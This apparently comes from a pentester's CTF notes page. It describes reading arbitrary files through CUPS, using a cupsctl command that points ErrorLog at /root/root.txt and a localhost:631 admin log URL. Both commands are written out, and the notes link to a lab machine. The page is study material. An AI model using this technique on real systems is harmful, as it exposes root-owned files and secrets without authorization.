---
description: >-
  Cupsctl LFI
title: Cupsctl LFI              # Add title here
date: 2022-08-11 08:00:00 -0600                           # Change the date to match completion date
categories: [05 Utilities, Cupsctl]                     # Change Templates to Writeup
tags: [utilities, cupsctl, lfi]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### LFI
An LFI is present if you have access to the system, you need to change the ErrorLog path for the file that you want to read:
```bash
cupsctl ErrorLog="/root/root.txt"
```
Then from the web server we need to go to the following path:
```bash
http://localhost:631/admin/log/error_log?
```
Examples:
[[Antique#^4440dd]]